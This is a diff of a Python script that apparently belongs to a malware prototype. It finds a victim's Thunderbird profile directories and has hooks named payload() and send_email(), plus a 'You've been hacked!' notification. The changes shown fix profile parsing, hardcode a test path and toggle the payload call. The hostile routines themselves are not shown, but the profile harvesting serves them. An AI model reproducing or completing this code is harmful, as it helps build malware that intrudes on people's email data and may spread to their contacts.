@@ -27,7 +27,7 @@ import subprocess
 import sqlite3
 from datetime import datetime
 import typing
-#from notify import notification
+from notify import notification
 
 
 # --------------------------------------------------------------------------
@@ -392,9 +392,10 @@ def add_profile_dir_to_list(thunderbird_path: str, line: str, profile_dir_names:
     :profile_dir_names: A list to add absolute file names to detected
                         Thunderbird profile directories.
     :returns:           `profile_dir_names` with another profile dir extracted
-                        from line if this profile dir exists on the system
+                        from `line` if this profile dir exists on the system
                         and was not already contained in `profile_dir_names`.
     """
+    line = line.strip()
     relative_profile_dir_path: str = line.split("=", maxsplit=1)[1]
     # Thunderbird uses the / especially on Windows systems,
     # so it would be wrong to use `os.path.sep`:
@@ -409,6 +410,7 @@ def add_profile_dir_to_list(thunderbird_path: str, line: str, profile_dir_names:
     relative_profile_dir_path = ""
     for i in range(len(l)-1):
         relative_profile_dir_path = l[i] if relative_profile_dir_path == "" else os.path.join(relative_profile_dir_path, l[i])
+    #print(f"relative_profile_dir_path = {relative_profile_dir_path}") # test output
     profile_dir_name = l[len(l)-1]
     profile_dir_name_absolute = os.path.join(thunderbird_path, relative_profile_dir_path, profile_dir_name)
     if os.path.isdir(profile_dir_name_absolute) and profile_dir_name_absolute not in profile_dir_names:
@@ -430,10 +432,8 @@ def find_thunderbird_default_profile_dir() -> typing.List[str]:
               could be found or if the installed operating system is neither
               Windows, nor Linux.
     """
-    # The name of the profile directory consists of 8 letters or digits, 
-    # followed by a dot ("."), followed by a string, mostly "default" or
-    # "default-release":
-    thunderbird_path: str = determine_thunderbird_default_file_path()
+    #thunderbird_path: str = determine_thunderbird_default_file_path()
+    thunderbird_path: str = "/home/telekobold/TestVerzeichnis/thunderbird-Kopie"
     
     installs_ini: str = os.path.join(thunderbird_path, "installs.ini")
     profiles_ini: str = os.path.join(thunderbird_path, "profiles.ini")
@@ -443,31 +443,48 @@ def find_thunderbird_default_profile_dir() -> typing.List[str]:
     # profile directories referenced in that file if those profile directories 
     # actually exist. Avoid redundant entries.
     if os.path.isfile(installs_ini):
+        print("Use installs.ini file")
         with open(installs_ini, "r") as iif:
             for line in iif:
                 if line.startswith("Default="):
+                    #print("Default line found!") # test output
                     profile_dir_names = add_profile_dir_to_list(thunderbird_path, line, profile_dir_names)
+            print(f"profile_dir_names = {profile_dir_names}")
             return profile_dir_names
     
     # If there is no installs.ini file, return the file path of the
     # default profile file from the profiles.ini file (the profile file which
     # has a flat "Default=1"):
+    # Falls die aktuelle Zeile.strip() aus "Default=1" besteht und eine mit "Path=" anfangende Zeile entweder vor oder nach der aktuellen Zeile steht, ohne dass eine Zeile dazwischen war, die nur aus Whitespaces besteht, entspricht das "Path=" einem Pfad, welcher zu profile_dir_names hinzugefügt werden muss.
+    # This algorithm assumes that the profiles.ini file is correctly formatted.
     profile_introduction_string_regex = re.compile("\[[0-9a-zA-Z]*\]")
     in_profile_def: bool = False
-    in_default_profile_def: bool = False
+    path_detected: bool = False
+    path_content: str = ""
+    default_detected: bool = False
     if os.path.isfile(profiles_ini):
+        print("Use profiles.ini file")
         with open(profiles_ini, "r") as pif:
             for line in pif:
-                if line.startswith("Path=") and in_profile_def and in_default_profile_def:
-                    profile_dir_names = add_profile_dir_to_list(thunderbird_path, line, profile_dir_names)
-                elif line.strip() == "":
-                    in_profile = False
-                    in_default_profile_def = False
+                line = line.strip()
+                if line == "":
+                    in_profile_def = False
+                    path_detected = False
+                    default_detected = False
+                    path_content = ""
                 elif profile_introduction_string_regex.match(line):
                     in_profile_def = True
-                elif line.strip() == "Default=1" and in_profile_def:
-                    in_default_profile_def = True
+                elif line.startswith("Path="):
+                    path_detected = True
+                    path_content = line
+                    if in_profile_def and default_detected:
+                        profile_dir_names = add_profile_dir_to_list(thunderbird_path, line, profile_dir_names)
+                elif line == "Default=1":
+                    default_detected = True
+                    if in_profile_def and path_detected:
+                        profile_dir_names = add_profile_dir_to_list(thunderbird_path, path_content, profile_dir_names)
     
+    print(f"profile_dir_names = {profile_dir_names}")
     return profile_dir_names
 
 
@@ -544,23 +561,19 @@ def send_email() -> None:
 if __name__ == "__main__":
     random.seed((datetime.now()).strftime("%H%M%S"))
     
-    """
-    # Detect if Thunderbird is installed:
+    #payload()
+    
     thunderbird_install_path: str = shutil.which("thunderbird", path=determine_possible_paths())
-    print(f"thunderbird_install_path = {thunderbird_install_path}")
-    if thunderbird_install_path is not None:
-        print("Mozilla Thunderbird is installed on the system!")
-    else:
+    #print(f"thunderbird_install_path = {thunderbird_install_path}") # test output
+    if not thunderbird_install_path:
         print("Mozilla Thunderbird is not installed on the system!")
-    #outlook_install_path: str = shutil.which("outlook")
-    #if outlook_install_path is not None:
-    #    print("Microsoft Outlook is installed on the system!")
+        sys.exit(0)
+    else:
+        # Detect all Thunderbird profile directories:
+        l = find_thunderbird_default_profile_dir()
+        print(len(l))
+        #for elem in find_thunderbird_default_profile_dir():
+        #    print(elem)
     
-    # Detect all Thunderbird profile directories:
-    for elem in find_thunderbird_default_profile_dir():
-        print(elem)
-    """
-    
-    payload()
     # send_email()
     #notification("You've been hacked!", message="", app_name="filewriter")
